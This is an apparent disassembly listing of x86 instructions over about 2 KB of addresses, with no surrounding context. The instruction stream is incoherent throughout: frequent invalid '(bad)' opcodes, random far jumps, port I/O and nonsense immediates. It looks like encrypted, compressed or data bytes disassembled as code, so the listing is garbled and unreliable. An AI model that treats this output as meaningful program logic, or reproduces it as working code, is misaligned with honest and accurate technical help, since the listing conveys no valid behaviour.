  41faf8:	fiadd  WORD PTR [edi]
  41fafa:	lds    ecx,FWORD PTR [ebx]
  41fafc:	(bad)
  41faff:	(bad)  
  41fb00:	clc    
  41fb01:	in     al,dx
  41fb02:	jecxz  0x41fafd
  41fb04:	in     al,0xf3
  41fb06:	in     eax,0xf3
  41fb08:	scas   al,BYTE PTR es:[edi]
  41fb09:	mul    dh
  41fb0b:	int    0xed
  41fb0d:	repz (bad) 
  41fb10:	mov    bh,0xdd
  41fb12:	stc    
  41fb13:	leave  
  41fb14:	fnstcw WORD PTR [edx+eiz*8-0x2d244006]
  41fb1b:	shr    cl,cl
  41fb1d:	fst    st(6)
  41fb1f:	aam    0xe2
  41fb21:	fsub   st(0),st
  41fb23:	(bad)  
  41fb25:	les    ebp,FWORD PTR [eax-0x4a4e4c12]
  41fb2b:	(bad)  
  41fb2c:	stc    
  41fb2d:	mov    ch,0xe8
  41fb2f:	out    0xd0,al
  41fb31:	repnz aad 0xfb
  41fb34:	(bad)  
  41fb36:	mov    esp,0xe1d9d2c3
  41fb3b:	add    eax,0xd509cacb
  41fb40:	fld    QWORD PTR [esi+edi*8]
  41fb43:	loop   0x41fb04
  41fb45:	in     al,dx
  41fb46:	bnd jmp 0x41fb2b
  41fb49:	retf   0xb2c4
  41fb4c:	fcom   st(7)
  41fb4e:	(bad)  
  41fb50:	hlt    
  41fb51:	mov    ah,0xfc
  41fb53:	stc    
  41fb54:	add    esp,edi
  41fb56:	mov    ebp,0xbe2df07
  41fb5b:	fadd   QWORD PTR [ebx]
  41fb5d:	or     ecx,DWORD PTR [edi]
  41fb5f:	les    eax,FWORD PTR [eax]
  41fb61:	add    ebx,ebx
  41fb63:	in     al,0xe3
  41fb65:	fdiv   DWORD PTR [edi-0x1f551d33]
  41fb6b:	(bad)  
  41fb6d:	retf   
  41fb6e:	lods   eax,DWORD PTR ds:[esi]
  41fb6f:	in     eax,dx
  41fb70:	mov    edx,0xbaeef4d4
  41fb75:	cmc    
  41fb76:	jecxz  0x41fb75
  41fb78:	loop   0x41fb55
  41fb7a:	(bad)  
  41fb7b:	out    0xd4,al
  41fb7d:	loopne 0x41fb80
  41fb7f:	mov    BYTE PTR [eax+ebx*8],0x12
  41fb83:	cli    
  41fb84:	retf   
  41fb85:	jmp    0x41fb35
  41fb87:	shl    ch,0xc9
  41fb8a:	mov    al,0xa8
  41fb8c:	repnz (bad) 
  41fb8e:	mov    ah,0xf6
  41fb90:	in     eax,dx
  41fb91:	in     al,dx
  41fb92:	jecxz  0x41fb5e
  41fb94:	ret    
  41fb95:	hlt    
  41fb96:	out    dx,eax
  41fb97:	aam    0xc6
  41fb99:	fdivr  QWORD PTR [edx+edi*8-0x5091407]
  41fba0:	loope  0x41fba4
  41fba2:	add    edi,esi
  41fba4:	mov    esi,0xd1c7c6dd
  41fba9:	icebp  
  41fbaa:	loop   0x41fb6e
  41fbac:	out    dx,al
  41fbad:	(bad)  
  41fbae:	rcl    ch,1
  41fbb0:	clc    
  41fbb1:	shr    cl,1
  41fbb3:	sar    DWORD PTR [ebx-0x92a0d3f],1
  41fbb9:	(bad)
  41fbbc:	cld    
  41fbbd:	fiadd  DWORD PTR ds:0xe5fafedb
  41fbc3:	retf   
  41fbc4:	jecxz  0x41fb8e
  41fbc6:	jmp    0x41fb93
  41fbc8:	into   
  41fbc9:	out    dx,al
  41fbca:	(bad)  [eax+ebx*8-0x3a20141a]
  41fbd1:	fnclex 
  41fbd3:	aad    0xfa
  41fbd5:	mov    ebp,0xecdbf7f6
  41fbda:	neg    esp
  41fbdc:	mov    edi,0x4e306f8
  41fbe1:	bswap  esp
  41fbe3:	add    ebp,ebx
  41fbe5:	stos   BYTE PTR es:[edi],al
  41fbe6:	shr    bh,1
  41fbe8:	(bad)  
  41fbe9:	loopne 0x41fbb1
  41fbeb:	loopne 0x41fbda
  41fbed:	rol    ch,1
  41fbef:	not    esp
  41fbf1:	mov    edi,0xfdfaeece
  41fbf6:	fsubr  st(2),st
  41fbf8:	test   ah,0xd2
  41fbfb:	or     bl,bh
  41fbfd:	enter  0xf607,0xe8
  41fc01:	cli    
  41fc02:	call   0xaef5b003
  41fc07:	mov    ebp,0xc8f7c2d3
  41fc0c:	loope  0x41fbf4
  41fc0e:	(bad)  
  41fc0f:	lock mov ch,0xd7
  41fc12:	jecxz  0x41fbeb
  41fc14:	loope  0x41fbd6
  41fc16:	loope  0x41fbfa
  41fc18:	mov    esp,0xe8d801e3
  41fc1d:	dec    BYTE PTR [ebx]
  41fc1f:	ror    dl,0xe3
  41fc22:	pmulhuw mm1,mm2
  41fc25:	mov    dl,0xea
  41fc27:	xlat   BYTE PTR ds:[ebx]
  41fc28:	into   
  41fc29:	retf   
  41fc2a:	out    0xf0,al
  41fc2c:	rcr    ebx,cl
  41fc2e:	rcl    ch,cl
  41fc30:	cli    
  41fc31:	ror    cl,cl
  41fc33:	out    dx,al
  41fc34:	sti    
  41fc35:	pop    es
  41fc36:	mov    eax,0xd202d7e6
  41fc3b:	(bad)  
  41fc3c:	(bad)  
  41fc3e:	leave  
  41fc3f:	retf   
  41fc40:	inc    esi
  41fc42:	loop   0x41fc35
  41fc44:	repnz xlat BYTE PTR ds:[ebx]
  41fc46:	jmp    0x41fc05
  41fc48:	div    bl
  41fc4a:	mov    ebx,0xecf5eae9
  41fc4f:	xlat   BYTE PTR ds:[ebx]
  41fc50:	cli    
  41fc51:	int3   
  41fc52:	loop   0x41fc26
  41fc54:	sar    ch,1
  41fc56:	loop   0x41fc25
  41fc58:	(bad)  
  41fc59:	in     eax,0xf3
  41fc5b:	mov    BYTE PTR ds:0xcdeb09f9,0xee
  41fc62:	loope  0x41fc65
  41fc64:	(bad)  
  41fc66:	icebp  
  41fc67:	(bad)  
  41fc68:	iret   
  41fc69:	int3   
  41fc6a:	call   0xc612ec3e
  41fc6f:	enter  0xdadf,0xbb
  41fc73:	mov    ebp,0xc3dcdbce
  41fc78:	aad    0xd5
  41fc7a:	cli    
  41fc7b:	fdivp  st(1),st
  41fc7d:	cld    
  41fc7e:	(bad)  
  41fc80:	clc    
  41fc81:	int3   
  41fc82:	repz pop es
  41fc84:	mov    ebp,0xdde0eec4
  41fc89:	rol    cl,cl
  41fc8b:	sar    cl,0xd9
  41fc8e:	out    0xe8,eax
  41fc90:	std    
  41fc91:	cmc    
  41fc92:	(bad)  
  41fc93:	cli    
  41fc94:	leave  
  41fc95:	(bad)  
  41fc96:	loopne 0x41fc91
  41fc98:	mov    eax,0x6e50907
  41fc9e:	add    esp,esp
  41fca0:	jecxz  0x41fc67
  41fca2:	add    ecx,DWORD PTR [edx]
  41fca4:	iret   
  41fca5:	int    0xed
  41fca7:	ror    bl,1
  41fca9:	leave  
  41fcaa:	mov    cl,0xe2
  41fcac:	out    dx,eax
  41fcad:	jmp    0xf213ee86
  41fcb2:	in     al,dx
  41fcb3:	shl    al,1
  41fcb5:	fdecstp 
  41fcb7:	repz add bl,al
  41fcba:	rol    al,1
  41fcbc:	retf   
  41fcbd:	fild   DWORD PTR ds:0xf203c4fc
  41fcc3:	add    bl,al
  41fcc5:	lods   eax,DWORD PTR ds:[esi]
  41fcc6:	in     al,dx
  41fcc7:	bnd ret 0xd2d6
  41fccb:	idiv   DWORD PTR [edx-0xa134420]
  41fcd1:	in     eax,dx
  41fcd2:	mov    ch,0xd1
  41fcd4:	into   
  41fcd5:	std    
  41fcd6:	hlt    
  41fcd7:	cli    
  41fcd8:	add    eax,0x7f2dde3
  41fcdd:	add    ebx,ebx
  41fcdf:	add    al,0xce
  41fce1:	out    dx,al
  41fce2:	repnz in eax,dx
  41fce4:	mov    edi,0xb6f1e0b1
  41fce9:	shl    ecx,0xd3
  41fcec:	in     eax,0xf9
  41fcee:	mov    bh,0xdd
  41fcf0:	in     eax,dx
  41fcf1:	in     al,dx
  41fcf2:	(bad)  
  41fcf4:	mov    bh,0xd9
  41fcf6:	rcl    ebp,1
  41fcf8:	loopne 0x41fcf7
  41fcfa:	rol    BYTE PTR [edx],0xa
  41fcfd:	jmp    0xc90e:0xfbd4c90f
  41fd04:	lods   al,BYTE PTR ds:[esi]
  41fd05:	mov    dl,0xdd
  41fd07:	in     al,0xc9
  41fd09:	out    dx,eax
  41fd0a:	out    0xd0,eax
  41fd0c:	iret   
  41fd0d:	(bad)  
  41fd0e:	out    0xfd,eax
  41fd10:	mov    dh,0xd4
  41fd12:	(bad)  
  41fd13:	sar    BYTE PTR [esi-0x2920263f],cl
  41fd19:	int3   
  41fd1a:	rol    BYTE PTR [ecx],cl
  41fd1c:	leave  
  41fd1d:	rol    DWORD PTR [edi],0xd4
  41fd20:	or     edx,esp
  41fd22:	or     eax,0xefbff313
  41fd27:	in     eax,dx
  41fd28:	jmp    0xb818df17
  41fd2d:	fcmovnbe st,st(7)
  41fd2f:	mov    edx,0xeee3f9cd
  41fd34:	mov    ebp,0xd3dfd0d1
  41fd39:	ret    
  41fd3a:	div    bh
  41fd3c:	lock (bad) 
  41fd3f:	add    dl,bh
  41fd41:	enter  0xcbf3,0xa9
  41fd45:	int3   
  41fd46:	int    0xde
  41fd48:	loop   0x41fd38
  41fd4a:	hlt    
  41fd4b:	cmc    
  41fd4c:	shr    bl,1
  41fd4e:	(bad)
  41fd51:	mov    ebx,0xf8fbb4ca
  41fd56:	out    dx,eax
  41fd57:	rol    BYTE PTR [edx],1
  41fd59:	les    eax,FWORD PTR [eax]
  41fd5b:	test   edi,0xfde3fcf7
  41fd61:	push   cs
  41fd62:	or     al,ah
  41fd64:	loope  0x41fd31
  41fd66:	mov    edi,0xd6dbd5f2
  41fd6b:	out    0xb0,eax
  41fd6d:	out    0xef,al
  41fd6f:	(bad)  
  41fd70:	(bad)  
  41fd71:	(bad)  
  41fd73:	clc    
  41fd74:	jecxz  0x41fd43
  41fd76:	stc    
  41fd77:	fld    QWORD PTR [edx]
  41fd79:	aad    0xf3
  41fd7b:	(bad)  
  41fd7d:	rol    BYTE PTR [ebx+ebx*8],0xc9
  41fd81:	dec    BYTE PTR [eax]
  41fd83:	fcomp  st(5)
  41fd85:	out    dx,eax
  41fd86:	(bad)  
  41fd87:	repz out dx,al
  41fd89:	icebp  
  41fd8a:	(bad)  
  41fd8b:	fnsetpm(287 only) 
  41fd8d:	clc    
  41fd8e:	lock mov ecx,0xd1b5ecbe
  41fd94:	repnz fcmovbe st,st(0)
  41fd97:	fincstp 
  41fd99:	(bad)  
  41fd9a:	fidivr DWORD PTR [eax+0xdc5dee7]
  41fda0:	push   es
  41fda1:	or     ebx,ebp
  41fda3:	jmp    0x41fd89
  41fda5:	shl    BYTE PTR [edi-0x3f3c3120],1
  41fdab:	shl    bl,cl
  41fdad:	idiv   al
  41fdaf:	in     al,dx
  41fdb0:	repz mov ebp,0xede8bfc3
  41fdb6:	(bad)  
  41fdb7:	call   esp
  41fdb9:	neg    cl
  41fdbb:	lock mov DWORD PTR [ebx],0xc40edae2
  41fdc2:	enter  0xd1da,0xc3
  41fdc6:	retf   
  41fdc7:	scas   al,BYTE PTR es:[edi]
  41fdc8:	xlat   BYTE PTR ds:[ebx]
  41fdc9:	mov    dh,0xd3
  41fdcb:	in     eax,0xaf
  41fdcd:	stc    
  41fdce:	(bad)  
  41fdcf:	(bad)  
  41fdd1:	mov    edx,0xc3d8d6e3
  41fdd6:	aam    0xdd
  41fdd8:	cli    
  41fdd9:	rcr    ebp,cl
  41fddb:	retf   
  41fddc:	shr    ebx,1
  41fdde:	(bad)  
  41fddf:	jmp    0xc4c3:0xfdffcbe3
  41fde6:	shr    BYTE PTR [esi+ebp*8-0x123b2d1e],0xcd
  41fdee:	mov    al,0xec
  41fdf0:	mov    edx,0xd6d902b6
  41fdf5:	std    
  41fdf6:	add    dh,bh
  41fdf8:	shl    ecx,1
  41fdfa:	mov    esp,0xd406f4c2
  41fdff:	dec    ecx
  41fe01:	retf   
  41fe02:	or     eax,0xefa6ea08
  41fe07:	shr    DWORD PTR [ebx-0x490e0c38],cl
  41fe0d:	mov    ch,0xda
  41fe0f:	mov    ebx,0xd2c9ecce
  41fe14:	fild   DWORD PTR [ecx]
  41fe16:	loop   0x41fe0e
  41fe18:	in     al,dx
  41fe19:	add    eax,0xdfc9fab9
  41fe1e:	std    
  41fe1f:	loopne 0x41fe1b
  41fe21:	fld    QWORD PTR ds:0xbcd7f30a
  41fe27:	mov    bh,0xad
  41fe29:	(bad)
  41fe2c:	shl    ebx,0xf3
  41fe2f:	mov    bh,0xeb
  41fe31:	repnz fcomi st,st(5)
  41fe34:	mov    ebp,0xf4d5bcb9
  41fe39:	aad    0xe1
  41fe3b:	test   DWORD PTR [edi],0xc509c0fe
  41fe41:	in     eax,0xe7
  41fe43:	stc    
  41fe44:	fabs   
  41fe46:	retf   0xd5e7
  41fe49:	in     al,0xb1
  41fe4b:	sar    eax,1
  41fe4d:	jmp    0x41fe34
  41fe4f:	int3   
  41fe50:	dec    esp
  41fe52:	mov    esi,0xf6eedae2
  41fe57:	icebp  
  41fe58:	(bad)  
  41fe59:	rcr    cl,1
  41fe5b:	in     al,0xdf
  41fe5d:	cld    
  41fe5e:	fld    DWORD PTR [edx]
  41fe60:	cmc    
  41fe61:	iret   
  41fe62:	loopne 0x41fe31
  41fe64:	(bad)  
  41fe65:	into   
  41fe66:	(bad)  
  41fe67:	int3   
  41fe68:	(bad)  
  41fe69:	out    dx,eax
  41fe6a:	repz retf 
  41fe6c:	leave  
  41fe6d:	(bad)  
  41fe6e:	in     al,dx
  41fe6f:	mov    ecx,0xfdf4b8e8
  41fe74:	xlat   BYTE PTR ds:[ebx]
  41fe75:	jecxz  0x41fe37
  41fe77:	clc    
  41fe78:	fild   DWORD PTR [esi+esi*8]
  41fe7b:	ffreep st(7)
  41fe7d:	div    edi
  41fe7f:	loopne 0x41fe7e
  41fe81:	leave  
  41fe82:	adc    bh,bh
  41fe84:	ret    0xb3be
  41fe87:	out    dx,eax
  41fe88:	(bad)  
  41fe8a:	loopne 0x41fe86
  41fe8c:	aad    0xf5
  41fe8e:	fucomi st,st(1)
  41fe90:	dec    bh
  41fe92:	leave  
  41fe93:	rcr    esp,1
  41fe95:	repnz aad 0xd2
  41fe98:	add    al,BYTE PTR [ecx]
  41fe9a:	std    
  41fe9b:	(bad)  
  41fe9c:	(bad)  
  41fe9e:	in     al,0xe8
  41fea0:	out    0xfe,eax
  41fea2:	sar    esi,0xca
  41fea5:	shl    ah,0xe4
  41fea8:	int    0xac
  41feaa:	(bad)  [ebx-0xc002647]
  41feb0:	mov    bh,0xf0
  41feb2:	retf   
  41feb3:	fdiv   st,st(0)
  41feb5:	lock push es
  41feb7:	mov    ah,0xf7
  41feb9:	sti    
  41feba:	aam    0xff
  41febc:	clc    
  41febd:	ror    BYTE PTR [ecx],0xca
  41fec0:	add    eax,0xc3060204
  41fec5:	ror    ch,0xc5
  41fec8:	ret    
  41fec9:	ror    edi,1
  41fecb:	retf   0xcac5
  41fece:	xlat   BYTE PTR ds:[ebx]
  41fecf:	in     eax,0xed
  41fed1:	mov    dl,0xde
  41fed3:	lock repnz mov edi,0xfa05fad4
  41feda:	std    
  41fedb:	add    bl,bl
  41fedd:	std    
  41fede:	(bad)  
  41fedf:	test   dh,0xfc
  41fee2:	dec    DWORD PTR ds:0xdec6e6b1
  41fee8:	loopne 0x41febc
  41feea:	rol    dl,0xb7
  41feed:	jmp    0xfb2faba2
  41fef2:	fnstcw WORD PTR [ecx+0x3cdffec]
  41fef8:	add    esi,esp
  41fefa:	out    0xfb,al
  41fefc:	(bad)  
  41fefe:	enter  0x3ef,0xed
  41ff02:	retf   
  41ff03:	fcomp  st(0)
  41ff05:	shr    BYTE PTR [eax-0x12394329],0xc5
  41ff0c:	lock mov ah,0xf4
  41ff0f:	jmp    0x41ff0e
  41ff11:	fdivp  st(4),st
  41ff13:	add    bh,al
  41ff15:	loope  0x41ff03
  41ff17:	into   
  41ff18:	(bad)  
  41ff19:	fcmovb st,st(0)
  41ff1b:	lds    edi,FWORD PTR [edi+0x9d4c4f7]
  41ff21:	or     eax,0xd8aa00cb
  41ff26:	mov    ebp,0xe9aae5b7
  41ff2b:	in     eax,0xbb
  41ff2d:	stc    
  41ff2e:	div    ch
  41ff30:	iret   
  41ff31:	std    
  41ff32:	call   0xc205ff15
  41ff37:	out    0xd5,al
  41ff39:	cli    
  41ff3a:	fld    DWORD PTR [ecx+ecx*8]
  41ff3d:	or     bl,cl
  41ff3f:	sti    
  41ff40:	loope  0x41ff26
  41ff42:	clc    
  41ff43:	in     al,dx
  41ff44:	icebp  
  41ff45:	(bad)  
  41ff46:	icebp  
  41ff47:	out    0xd6,eax
  41ff49:	retf   
  41ff4a:	call   0xf5f4b236
  41ff4f:	int3   
  41ff50:	in     eax,dx
  41ff51:	jmp    0xd23abc58
  41ff56:	rcr    bh,cl
  41ff58:	idiv   BYTE PTR [ebp-0x1b383b28]
  41ff5e:	xlat   BYTE PTR ds:[ebx]
  41ff5f:	aad    0xa
  41ff61:	std    
  41ff62:	pop    es
  41ff63:	(bad)  
  41ff64:	jmp    0xc1f3:0xd2c3b3e1
  41ff6b:	div    DWORD PTR [ecx-0x23060008]
  41ff71:	repnz push eax
  41ff74:	add    dh,ch
  41ff76:	sti    
  41ff77:	int    0xc7
  41ff79:	shl    cl,cl
  41ff7b:	in     al,0xeb
  41ff7d:	or     edi,ebp
  41ff7f:	mov    esp,0xf3e1090f
  41ff84:	into   
  41ff85:	shl    DWORD PTR [ebx-0x1124141c],cl
  41ff8b:	mov    cl,0xb4
  41ff8d:	lock in eax,dx
  41ff8f:	icebp  
  41ff90:	hlt    
  41ff91:	(bad)  
  41ff93:	mov    al,0xd7
  41ff95:	out    dx,al
  41ff96:	(bad)  
  41ff97:	(bad)  
  41ff99:	repnz loopne 0x41ff85
  41ff9c:	add    esp,edx
  41ff9e:	add    BYTE PTR ds:0xf200efdf,al
  41ffa4:	mov    ebp,0xc8f7dfe2
  41ffa9:	shr    bh,1
  41ffab:	jmp    0x41ff75
  41ffad:	icebp  
  41ffae:	mov    al,0xf2
  41ffb0:	(bad)  
  41ffb1:	jmp    0xc1f9:0xd9c8d5b5
  41ffb8:	add    dl,cl
  41ffba:	rcr    esp,cl
  41ffbc:	(bad)  
  41ffbe:	cli    
  41ffbf:	or     al,BYTE PTR [edi+ecx*8]
  41ffc2:	or     edx,ebx
  41ffc4:	shl    BYTE PTR [edx-0x2d1a1e38],1
  41ffca:	mov    bl,0xda
  41ffcc:	out    dx,eax
  41ffcd:	rcl    bh,cl
  41ffcf:	mov    esi,0xf0f9d3b3
  41ffd4:	aam    0x2
  41ffd6:	(bad)  
  41ffd7:	rol    BYTE PTR [edi],1
  41ffd9:	loope  0x41ffbf
  41ffdb:	test   DWORD PTR [ecx],0xcbcb0405
  41ffe1:	cld    
  41ffe2:	adc    eax,DWORD PTR [edx]
  41ffe4:	mov    ebp,0xc8c4ccce
  41ffe9:	ret    0xc6b5
  41ffec:	cli    
  41ffed:	cmc    
  41ffee:	rcl    ecx,cl
  41fff0:	fcomip st,st(5)
  41fff2:	hlt    
  41fff3:	in     eax,dx
  41fff4:	aad    0x1
  41fff6:	mov    esi,0xe6d5d7fe
  41fffb:	retf   
  41fffc:	jmp    0x53ee6e3
  420001:	aam    0xe2
  420003:	in     eax,dx
  420004:	in     al,dx
  420005:	leave  
  420006:	fbstp  TBYTE PTR [edi-0x32384913]
  42000c:	out    dx,eax
  42000d:	scas   al,BYTE PTR es:[edi]
  42000e:	repz iret 
  420010:	stc    
  420011:	mov    ch,0xfc
  420013:	jecxz  0x41fff8
  420015:	not    dl
  420017:	mov    esp,0xd5d5d2d4
  42001c:	shr    bh,0xdc
  42001f:	mov    DWORD PTR [eax],0xb1fc12ef
  420025:	mov    eax,0xccf0adb3
  42002a:	lock out dx,al
  42002c:	loopne 0x420014
  42002e:	fcmovu st,st(0)
  420030:	mov    ebx,0xf6db02f6
  420035:	mov    ebp,0xbaf4fae0
  42003a:	cld    
  42003b:	push   es
  42003c:	mov    edi,0xd9ca0ffa
  420041:	iret   
  420042:	loop   0x420037
  420044:	stos   BYTE PTR es:[edi],al
  420045:	jmp    0x420038
  420047:	out    0xcf,al
  420049:	loop   0x42000f
  42004b:	lods   al,BYTE PTR ds:[esi]
  42004c:	leave  
  42004d:	into   
  42004e:	(bad)  
  420050:	int3   
  420051:	jmp    0xfe1d0045
  420056:	fdivr  QWORD PTR [ebp-0x4094126]
  42005c:	call   0xc4300b61
  420061:	enter  0x3df,0xc1
  420065:	lods   eax,DWORD PTR ds:[esi]
  420066:	test   cl,0xe8
  420069:	sti    
  42006a:	cmc    
  42006b:	cmc    
  42006c:	hlt    
  42006d:	fistp  QWORD PTR [ecx-0x452b1725]
  420073:	repnz enter 0xd201,0xe1
  420078:	rol    dh,cl
  42007a:	fscale 
  42007c:	inc    ebp
  42007e:	xlat   BYTE PTR ds:[ebx]
  42007f:	jecxz  0x42006a
  420081:	leave  
  420082:	cli    
  420083:	shr    dl,0xcd
  420086:	retf   
  420087:	in     al,0xf2
  420089:	aad    0xfa
  42008b:	lods   al,BYTE PTR ds:[esi]
  42008c:	rol    dh,cl
  42008e:	cli    
  42008f:	fdivr  DWORD PTR [ecx-0x36404737]
  420095:	ret    
  420096:	fcmovb st,st(1)
  420098:	repnz add ebx,esi
  42009b:	(bad)  
  42009c:	cmc    
  42009d:	or     edi,eax
  42009f:	ffree  st(4)
  4200a1:	jmp    0x42008d
  4200a3:	out    0xae,al
  4200a5:	shl    edx,cl
  4200a7:	loop   0x42006d
  4200a9:	in     al,dx
  4200aa:	aad    0xca
  4200ac:	out    0xb5,eax
  4200ae:	mov    cl,0xc8
  4200b0:	sar    bl,1
  4200b2:	retf   
  4200b3:	aam    0xef
  4200b5:	mov    edi,0x1d8b8b5
  4200ba:	retf   
  4200bb:	fldpi  
  4200bd:	xlat   BYTE PTR ds:[ebx]
  4200be:	jmp    0x4200cd
  4200c0:	fucomp st(2)
  4200c2:	fsubr  st(3),st
  4200c4:	test   eax,0xc3e4e3ed
  4200c9:	mov    bh,0xd2
  4200cb:	(bad)  
  4200cd:	scas   al,BYTE PTR es:[edi]
  4200ce:	mov    ecx,0xd3b8cacb
  4200d3:	aad    0xd2
  4200d5:	std    
  4200d6:	(bad)  
  4200d8:	out    0xe5,eax
  4200da:	aad    0xe5
  4200dc:	retf   0xe6e9
  4200df:	lds    eax,FWORD PTR [ebx]
  4200e1:	push   cs
  4200e2:	les    eax,FWORD PTR [ecx]
  4200e4:	(bad)  
  4200e5:	(bad)  
  4200e7:	repz hlt 
  4200e9:	int    0xe4
  4200eb:	cmc    
  4200ec:	in     eax,0xb8
  4200ee:	aad    0xea
  4200f0:	(bad)
  4200f3:	repnz test dh,0xd0
  4200f7:	cli    
  4200f8:	mov    esp,0xcbdffdf5
  4200fd:	fsubr  st,st(2)
  4200ff:	pconfig 
  420102:	add    ecx,DWORD PTR ds:0xe5a5e7d3
  420108:	mov    bl,0xc6
  42010a:	in     al,0xcf
  42010c:	int3   
  42010d:	call   0xde3fb8c6
  420112:	aad    0xdb
  420114:	add    eax,DWORD PTR [edi]
  420116:	(bad)  
  420117:	mov    ebp,0xd0c4bdfe
  42011c:	rcl    dh,1
  42011e:	mov    ch,0xcd
  420121:	or     eax,0xe9b1efe0
  420126:	(bad)  
  420127:	jmp    0xb7f6:0xf6e8edec
  42012e:	enter  0xe8d6,0xee
  420132:	mov    eax,0xfde7c9f4
  420137:	hlt    
  420138:	mov    esp,0xf0c2d6
  42013d:	std    
  42013e:	push   cs
  42013f:	in     eax,dx
  420140:	call   0xec31c94b
  420145:	mov    cl,0xa8
  420147:	loop   0x4200f7
  420149:	retf   0xd2f0
  42014c:	in     eax,0xf5
  42014e:	(bad)
  420151:	shr    dh,cl
  420153:	fcomp  st(0)
  420155:	int3   
  420156:	ret    
  420157:	stc    
  420158:	loopne 0x420135
  42015a:	in     eax,0xd2
  42015c:	ret    0xc5fc
  42015f:	in     eax,0xca
  420161:	vpavgw ymm5,ymm0,YMMWORD PTR [esi-0x1f371758]
  420169:	int3   
  42016a:	mov    bl,0xf6
  42016c:	int    0xcc
  42016e:	in     eax,dx
  42016f:	sti    
  420170:	xlat   BYTE PTR ds:[ebx]
  420171:	mov    dh,0xf0
  420173:	retf   0xb6db
  420176:	add    dl,ch
  420178:	sti    
  420179:	mul    ah
  42017b:	jecxz  0x42015a
  42017d:	jmp    0xd027ed7f
  420182:	jmp    0xbcb1:0xa8dee008
  420189:	ret    
  42018a:	retf   0xcfef
  42018d:	mov    cl,0xbb
  42018f:	leave  
  420190:	out    dx,al
  420191:	mov    dl,0xb4
  420193:	retf   0xd8e1
  420196:	in     eax,dx
  420197:	into   
  420198:	repz sar bh,0xca
  42019c:	ret    0xe4c9
  42019f:	in     eax,dx
  4201a0:	sti    
  4201a1:	fucom  st(6)
  4201a3:	fst    st(0)
  4201a5:	enter  0xe4b3,0xc3
  4201a9:	cmc    
  4201aa:	(bad)  
  4201ab:	jmp    0x4201a6
  4201ad:	repnz mov cl,0xc5
  4201b0:	(bad)  
  4201b2:	rol    BYTE PTR [ebx],1
  4201b4:	repnz sti 
  4201b6:	add    BYTE PTR [edi],al
  4201b8:	shl    edx,0xdc
  4201bb:	in     al,0x6
  4201bd:	fld    QWORD PTR [edi]
  4201bf:	cmc    
  4201c0:	ret    
  4201c1:	cli    
  4201c2:	retf   0xe605
  4201c5:	rcr    esi,1
  4201c7:	mov    esp,0xd6f2b5f1
  4201cc:	stc    
  4201cd:	mov    al,0xca
  4201cf:	clc    
  4201d0:	mov    eax,0xf1ddc9e8
  4201d5:	in     al,dx
  4201d6:	lock add ebp,eax
  4201d9:	fdivr  DWORD PTR [ebp-0x17fa362f]
  4201df:	in     eax,0xdd
  4201e1:	repz retf 0xddf1
  4201e5:	test   eax,0xdcb0eac5
  4201ea:	loop   0x4201d7
  4201ec:	call   0xb91dafc3
  4201f1:	retf   0xcec8
  4201f4:	aam    0xef
  4201f6:	aad    0xc7
  4201f8:	add    BYTE PTR [edx-0x2101f520],bh
  4201fe:	jmp    0xea05:0x103dc01
  420205:	in     eax,dx
  420206:	mov    cl,0xf2
  420208:	fadd   st(3),st
  42020a:	loope  0x4201f5
  42020c:	mov    cl,0xb4
  42020e:	(bad)  
  42020f:	fdecstp 
  420211:	aam    0xce
  420213:	mov    esi,0xffd5f2ec
  420218:	in     al,dx
  420219:	clc    
  42021a:	jmp    0xe0f8:0xc4d8d8e0
  420221:	in     eax,dx
  420222:	in     eax,dx
  420223:	retf   
  420224:	loope  0x4201fd
  420226:	shr    bl,0xe9
  420229:	mov    dl,0xc5
  42022b:	in     eax,dx
  42022c:	into   
  42022d:	mov    dl,0xee
  42022f:	lods   al,BYTE PTR ds:[esi]
  420230:	sar    ch,1
  420232:	mov    eax,0xdcf8c9bc
  420237:	cli    
  420238:	ffreep st(2)
  42023a:	add    ebp,eax
  42023c:	or     bl,ch
  42023e:	loop   0x42020f
  420240:	int    0xa
  420242:	int3   
  420243:	or     ebx,ebp
  420245:	rol    al,cl
  420247:	lock retf 
  420249:	mov    al,0xee
  42024b:	div    eax
  42024d:	hlt    
  42024e:	sti    
  42024f:	mov    bh,0xf0
  420251:	repz add bl,ah
  420254:	rol    BYTE PTR [edi],1
  420256:	out    dx,al
  420257:	(bad)  
  420258:	cmc    
  420259:	jecxz  0x42022b
  42025b:	fmulp  st(3),st
  42025d:	mov    DWORD PTR ds:0xfedd8ff,0xa5d0b309
  420267:	loopne 0x42024f
  420269:	iret   
  42026a:	cli    
  42026b:	(bad)  
  42026c:	out    dx,eax
  42026d:	mov    ch,0xb4
  42026f:	xlat   BYTE PTR ds:[ebx]
  420270:	call   0xecfbcc4e
  420275:	lock idiv DWORD PTR [eax+eiz*8-0x1a35fb1d]
  42027d:	retf   
  42027e:	hlt    
  42027f:	stc    
  420280:	fisttp WORD PTR [edx]
  420282:	(bad)  
  420283:	in     eax,0xd3
  420285:	sar    DWORD PTR [edi-0x440b4818],cl
  42028b:	icebp  
  42028c:	mov    dh,0xb4
  42028e:	stc    
  42028f:	mov    bh,0xcd
  420291:	ror    dl,cl
  420293:	out    dx,al
  420294:	out    dx,eax
  420295:	hlt    
  420296:	loope  0x420286
  420298:	push   es
  420299:	hlt    
  42029a:	jmp    0xd5e9:0xc1cbd9f4
  4202a1:	loop   0x4202a4
  4202a3:	jecxz  0x420274
  4202a5:	xlat   BYTE PTR ds:[ebx]
  4202a6:	in     al,0xdd
  4202a8:	(bad)  
  4202a9:	shr    dh,0xec
  4202ac:	mov    bh,0xcd
  4202ae:	lods   eax,DWORD PTR ds:[esi]
  4202af:	mov    ch,0xf1
  4202b1:	repz leave 
  4202b3:	(bad)  
  4202b5:	mov    eax,0xf4c3cdf2
  4202ba:	rcl    bh,1
  4202bc:	loop   0x4202c0
  4202be:	add    eax,eax
  4202c0:	stc    
  4202c1:	fadd   st(1),st
  4202c3:	or     BYTE PTR [ecx-0x2b213413],dh
  4202c9:	lock out dx,al
  4202cb:	mov    ebx,0xbaf5cdca
  4202d0:	fcmovbe st,st(1)
  4202d2:	(bad)  
  4202d4:	repnz in al,dx
  4202d6:	neg    ebx
  4202d8:	ret    
  4202d9:	neg    ecx
  4202db:	(bad)  
  4202dc:	aam    0xdf
  4202de:	in     eax,0xfd
  4202e0:	int    0xec
  4202e2:	repz in al,0xe3
  4202e5:	lock lods eax,DWORD PTR ds:[esi]
  4202e7:	loope  0x42029c
  4202e9:	lods   al,BYTE PTR ds:[esi]
  4202ea:	shr    DWORD PTR [eax-0x2c081705],0xce
  4202f1:	mov    ah,0xfe
  4202f3:	xlat   BYTE PTR ds:[ebx]
  4202f4:	mov    bh,0xfa
  4202f6:	ffree  st(6)
